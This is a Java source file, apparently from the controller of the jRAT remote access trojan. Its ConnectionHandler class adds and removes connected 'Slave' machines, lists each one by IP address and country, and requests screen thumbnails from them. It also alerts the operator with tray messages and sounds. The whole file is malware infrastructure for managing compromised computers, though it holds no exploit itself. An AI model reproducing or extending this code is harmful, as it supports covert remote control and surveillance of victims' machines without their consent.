package pro.jrat.net;

import pro.jrat.Main;
import pro.jrat.SampleMode;
import pro.jrat.Slave;
import pro.jrat.Sound;
import pro.jrat.exceptions.CloseException;
import pro.jrat.extensions.PluginEventHandler;
import pro.jrat.packets.outgoing.Packet40Thumbnail;
import pro.jrat.ui.frames.Frame;
import pro.jrat.utils.TrayIconUtils;
import pro.jrat.utils.Utils;

public class ConnectionHandler {

	public synchronized static void addSlave(Slave slave) {
		Main.connections.add(slave);
		
		Object icon = null;
		
		if (Frame.thumbnails) {
			icon = "...";
			slave.addToSendQueue(new Packet40Thumbnail());
		} else {
			icon = slave.getCountry();
		}
		
		Frame.mainModel.addRow(new Object[] { icon, "Unknown", "Loading...", slave.getIP(), "?", "Unknown", "Unknown", "0 mb" });
		
		String title = Main.formatTitle();
		Main.instance.setTitle(title);
		
		TrayIconUtils.setTitle(title);
		TrayIconUtils.showMessage(title, "Server " + slave.getIP() + " connected");
		
		Sound.playAdd();
		PluginEventHandler.onConnect(slave);
	}

	public synchronized static void removeSlave(Slave client, Exception e) {
		if (SampleMode.isInSampleMode()) {
			return;
		}
		
		Main.connections.remove(client);
		try {
			Frame.mainModel.removeRow(Utils.getRow(3, client.getIP()));
		} catch (Exception ex) {
		}
		String title = Main.formatTitle();
		Main.instance.setTitle(title);
		TrayIconUtils.setTitle(title);
		client.closeSocket(new CloseException("Removing connection..."));
		Sound.playRemove();
	}

}
